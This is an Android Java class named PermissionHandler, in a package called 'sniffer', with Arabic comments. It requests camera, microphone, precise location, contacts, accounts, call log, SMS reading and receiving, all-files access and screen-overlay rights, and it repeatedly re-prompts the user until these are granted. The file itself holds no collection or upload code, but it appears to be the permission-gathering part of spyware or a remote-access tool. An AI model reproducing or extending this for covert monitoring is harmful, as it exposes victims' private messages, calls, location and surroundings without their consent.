package com.v8.global.sniffer;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import java.util.ArrayList;
import java.util.List;

public class PermissionHandler {

    private static final int PERMISSION_REQUEST_CODE = 1234;
    private static final int SYSTEM_ALERT_WINDOW_CODE = 1235;
    private static final int MANAGE_STORAGE_CODE = 1236;
    
    private Activity activity;
    private PermissionCallback callback;
    private List<String> pendingPermissions = new ArrayList<>();
    
    public interface PermissionCallback {
        void onAllPermissionsGranted();
        void onPermissionDenied();
    }

    public PermissionHandler(Activity activity) {
        this.activity = activity;
    }

    public void setCallback(PermissionCallback callback) {
        this.callback = callback;
    }

    public void requestPermissions() {
        // قائمة الصلاحيات المطلوبة
        String[] permissions = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS
        };

        // جمع الصلاحيات التي لم تمنح بعد
        pendingPermissions.clear();
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(activity, permission) != PackageManager.PERMISSION_GRANTED) {
                pendingPermissions.add(permission);
            }
        }

        // طلب الصلاحيات الخاصة أولاً
        requestSpecialPermissions();
    }

    private void requestSpecialPermissions() {
        // صلاحية العرض فوق التطبيقات
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(activity)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + activity.getPackageName()));
                activity.startActivityForResult(intent, SYSTEM_ALERT_WINDOW_CODE);
                return;
            }
        }

        // صلاحية إدارة الملفات للأندرويد 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + activity.getPackageName()));
                activity.startActivityForResult(intent, MANAGE_STORAGE_CODE);
                return;
            }
        }

        // طلب باقي الصلاحيات
        if (!pendingPermissions.isEmpty()) {
            ActivityCompat.requestPermissions(activity, 
                pendingPermissions.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            if (callback != null) callback.onAllPermissionsGranted();
        }
    }

    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                if (callback != null) callback.onAllPermissionsGranted();
            } else {
                if (callback != null) callback.onPermissionDenied();
            }
        }
    }

    public void onActivityResult(int requestCode) {
        if (requestCode == SYSTEM_ALERT_WINDOW_CODE || requestCode == MANAGE_STORAGE_CODE) {
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    requestSpecialPermissions();
                }
            }, 1000);
        }
    }
                    }
